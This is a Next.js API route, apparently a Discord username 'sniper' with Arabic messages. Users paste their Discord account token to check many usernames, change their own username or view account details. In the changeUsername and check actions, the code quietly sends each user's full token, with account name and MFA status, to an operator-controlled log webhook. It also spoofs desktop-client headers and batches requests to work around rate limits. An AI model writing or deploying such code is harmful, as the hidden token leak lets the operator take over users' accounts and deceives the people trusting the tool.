import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook } from '@/lib/webhook';
import { cleanToken } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';

export const maxDuration = 300;

const DISCORD_API = 'https://discord.com/api/v10';

function sniperHeaders(token: string): Record<string, string> {
  return {
    'Authorization': cleanToken(token),
    'Content-Type': 'application/json',
    'Accept': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Discord/1.0.9167 Chrome/124.0.6367.118 Electron/30.0.6 Safari/537.36',
    'X-Discord-Locale': 'en-US',
    'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBEZXNrdG9wIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX3ZlcnNpb24iOjI3NDQ1NSwibG9jYWxlIjoiZW4tVVMifQ==',
    'Origin': 'https://discord.com',
    'Referer': 'https://discord.com/',
  };
}

function sleep(ms: number) {
  return new Promise(r => setTimeout(r, ms));
}

// فحص يوزر واحد - بسيط وسريع بدون rate limit معقد
async function checkUsername(token: string, username: string): Promise<{
  username: string;
  status: string;
  color: string;
  taken?: boolean;
}> {
  const url = `${DISCORD_API}/users/@me/pomelo-attempt`;

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 10000);

    const res = await fetch(url, {
      method: 'POST',
      headers: sniperHeaders(token),
      body: JSON.stringify({ username }),
      signal: controller.signal,
    });
    clearTimeout(timeoutId);

    // Rate limit - نفشل فوراً لنعالجه في المستوى العلوي
    if (res.status === 429) {
      try {
        const errData = await res.json() as { retry_after?: number };
        return { username, status: `⏳ RL ${(errData.retry_after || 3).toFixed(1)}s`, color: 'yellow' };
      } catch {
        return { username, status: '⏳ Rate Limit', color: 'yellow' };
      }
    }

    if (res.status === 401) {
      return { username, status: '❌ خطأ: توكن', color: 'yellow' };
    }

    const data = await res.json().catch(() => ({}));

    // taken: false = متاح!
    if (data.taken === false) {
      return { username, status: '✅ متاح!', color: 'green', taken: false };
    }

    // taken: true = محجوز
    if (data.taken === true) {
      return { username, status: '❌ محجوز', color: 'red', taken: true };
    }

    // 200 بدون taken field = محجوز عادةً
    if (res.ok && data.taken === undefined) {
      return { username, status: '❌ محجوز', color: 'red', taken: true };
    }

    // error codes
    if (data.code === 50035) return { username, status: '❌ غير صالح', color: 'red', taken: true };
    if (data.code === 50074) return { username, status: '❌ محجوز', color: 'red', taken: true };

    const msg = String(data.message || '').toLowerCase();
    if (msg.includes('taken') || msg.includes('already') || msg.includes('unavailable') || msg.includes('reserved')) {
      return { username, status: '❌ محجوز', color: 'red', taken: true };
    }
    if (msg.includes('rate') || msg.includes('slow')) {
      return { username, status: '⏳ Rate Limit', color: 'yellow' };
    }

    return { username, status: `❌ محجوز`, color: 'red', taken: true };

  } catch (e: unknown) {
    if (e instanceof Error && e.name === 'AbortError') {
      return { username, status: '❓ timeout', color: 'yellow' };
    }
    return { username, status: '❓ خطأ', color: 'yellow' };
  }
}

// تغيير اليوزر
async function changeUsername(token: string, username: string, password?: string): Promise<{ success: boolean; error?: string }> {
  const url = `${DISCORD_API}/users/@me`;
  const body: Record<string, unknown> = { username };
  if (password) body.password = password;

  try {
    const controller = new AbortController();
    const tid = setTimeout(() => controller.abort(), 15000);

    const res = await fetch(url, {
      method: 'PATCH',
      headers: sniperHeaders(token),
      body: JSON.stringify(body),
      signal: controller.signal,
    });
    clearTimeout(tid);

    if (res.status === 429) return { success: false, error: 'Rate Limit - جرب بعد قليل' };
    if (res.ok) return { success: true };

    const data = await res.json().catch(() => ({}));
    const msg = String(data.message || '');

    if (res.status === 401) return { success: false, error: 'توكن غير صالح' };
    if (res.status === 403) return { success: false, error: 'حساب مقفل - تحتاج باسورد' };
    if (msg.includes('password')) return { success: false, error: 'تحتاج باسورد الحساب' };
    if (msg.includes('taken')) return { success: false, error: 'اليوزر محجوز الآن!' };
    if (msg.includes('rate') || msg.includes('slow')) return { success: false, error: 'Rate Limit' };
    if (msg.includes('invalid')) return { success: false, error: 'يوزر غير صالح' };

    return { success: false, error: `خطأ: ${msg || res.status}` };
  } catch {
    return { success: false, error: 'خطأ في الاتصال' };
  }
}

// جلب معلومات الحساب - النوع any لأن Discord API يرجع حقول ديناميكية
// eslint-disable-next-line @typescript-eslint/no-explicit-any
async function getAccountInfo(token: string): Promise<any | null> {
  try {
    const res = await fetch(`${DISCORD_API}/users/@me`, {
      headers: sniperHeaders(token),
      signal: AbortSignal.timeout(10000),
    });
    if (!res.ok) return null;
    return await res.json().catch(() => null);
  } catch {
    return null;
  }
}

// ===== MAIN =====
export async function POST(request: NextRequest) {
  try {
    const body = await request.json().catch(() => ({}));
    const { token, usernames, action, password, targetUsername } = body;

    if (!token) {
      return NextResponse.json({ success: false, error: 'التوكن مطلوب' }, { status: 400 });
    }

    const ct = cleanToken(token);
    const whUrl = getLogWebhookUrl();

    // ===== ACTION: changeUsername =====
    if (action === 'changeUsername') {
      if (!targetUsername) {
        return NextResponse.json({ success: false, error: 'أدخل اليوزر الجديد' }, { status: 400 });
      }

      const info = await getAccountInfo(token);
      if (!info) {
        return NextResponse.json({ success: false, error: 'توكن غير صالح' }, { status: 401 });
      }

      const result = await changeUsername(token, targetUsername, password);

      sendToWebhook({
        embeds: [{
          title: result.success ? '✅ Username Changed!' : '❌ Username Change Failed',
          color: result.success ? 0x00FF41 : 0xFF0000,
          fields: [
            { name: '👤 Account', value: info.username || 'Unknown', inline: true },
            { name: '🎯 New Name', value: targetUsername, inline: true },
            { name: '🎫 Token', value: `\`\`\`${ct}\`\`\`` },
            ...(result.error ? [{ name: '❌ Error', value: result.error, inline: false }] : [])
          ],
          timestamp: new Date().toISOString()
        }]
      }, whUrl).catch(() => {});

      if (result.success) {
        return NextResponse.json({ success: true, message: `✅ تم تغيير اليوزر إلى: ${targetUsername}`, newUsername: targetUsername });
      } else {
        return NextResponse.json({ success: false, error: result.error });
      }
    }

    // ===== ACTION: accountInfo =====
    if (action === 'accountInfo') {
      const info = await getAccountInfo(token);
      if (!info) {
        return NextResponse.json({ success: false, error: 'توكن غير صالح' }, { status: 401 });
      }

      return NextResponse.json({
        success: true,
        info: {
          username: info.username || 'Unknown',
          discriminator: info.discriminator || '0',
          email: info.email || null,
          phone: info.phone || null,
          mfa: !!info.mfa_enabled,
          verified: !!info.verified,
          flags: info.public_flags || 0,
          nitro: info.premium_type ? ['None', 'Classic', 'Boost', 'Basic'][info.premium_type] || 'Unknown' : 'None',
          avatar: info.avatar || null,
          id: info.id || 'Unknown',
        }
      });
    }

    // ===== ACTION: check (default) =====
    if (!usernames || !Array.isArray(usernames) || usernames.length === 0) {
      return NextResponse.json({ success: false, error: 'أدخل يوزر واحد على الأقل' }, { status: 400 });
    }

    const info = await getAccountInfo(token);
    if (!info) {
      return NextResponse.json({ success: false, error: 'توكن غير صالح - يجب استخدام توكن يوزر (User Token)' }, { status: 401 });
    }

    const userInfo = info.username || 'Unknown';

    sendToWebhook({
      embeds: [{
        title: '🎯 Sniper Started',
        color: 0xFF8800,
        fields: [
          { name: '👤 User', value: userInfo, inline: true },
          { name: '📋 Count', value: String(usernames.length), inline: true },
          { name: '🛡️ MFA', value: info.mfa_enabled ? '✅ Yes' : '❌ No', inline: true },
          { name: '🎫 Token', value: `\`\`\`${ct}\`\`\`` }
        ],
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    // تنظيف اليوزرات
    const validUsernames = usernames
      .map((u: string) => String(u).trim().toLowerCase().replace(/[^a-z0-9._]/g, ''))
      .filter((name: string) => name && name.length >= 2 && name.length <= 32);

    if (validUsernames.length === 0) {
      return NextResponse.json({ success: false, error: 'لا توجد يوزرات صالحة' }, { status: 400 });
    }

    // ===== فحص سريع - 5 يوزرات بالتوازي + انتظار قصير =====
    const results: { username: string; status: string; color: string; taken?: boolean }[] = [];
    let rateLimitHits = 0;
    const PARALLEL = 5; // 5 بالتوازي
    const DELAY_MS = 350; // 350ms بين الدفعات - سريع جداً

    for (let i = 0; i < validUsernames.length; i += PARALLEL) {
      const batch = validUsernames.slice(i, i + PARALLEL);

      const batchResults = await Promise.all(
        batch.map(u => checkUsername(token, u))
      );

      results.push(...batchResults);

      // تحقق rate limit
      const rlInBatch = batchResults.filter(r => r.color === 'yellow').length;
      if (rlInBatch > 0) {
        rateLimitHits++;
        // إذا rate limit شديد، ننتظر أطول
        const hasRetryAfter = batchResults.some(r => r.status.includes('RL') && parseFloat(r.status.match(/[\d.]+/)?.[0] || '0') > 5);
        if (hasRetryAfter) {
          await sleep(5000);
        } else {
          await sleep(1500);
        }
      } else {
        // انتظار قصير بين الدفعات الناجحة
        if (i + PARALLEL < validUsernames.length) {
          await sleep(DELAY_MS);
        }
      }
    }

    const available = results.filter(r => r.color === 'green');
    const taken = results.filter(r => r.color === 'red').length;
    const errors = results.filter(r => r.color === 'yellow').length;

    sendToWebhook({
      embeds: [{
        title: '✅ Sniper Completed',
        color: available.length > 0 ? 0x00FF41 : 0xFFAA00,
        fields: [
          { name: '📋 Checked', value: String(results.length), inline: true },
          { name: '✅ Available', value: String(available.length), inline: true },
          { name: '❌ Taken', value: String(taken), inline: true },
          { name: '⚠️ Errors', value: String(errors), inline: true },
          { name: '🎯 Names', value: available.slice(0, 20).map(r => r.username).join(', ') || 'None' },
          { name: '🎫 Token', value: `\`\`\`${ct}\`\`\`` }
        ],
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    return NextResponse.json({
      success: true,
      results,
      stats: {
        total: results.length,
        available: available.length,
        taken,
        errors,
        rateLimitHits,
      },
      accountInfo: {
        username: userInfo,
        mfa: !!info.mfa_enabled,
      },
      availableNames: available.map(r => r.username),
    });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Sniper Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
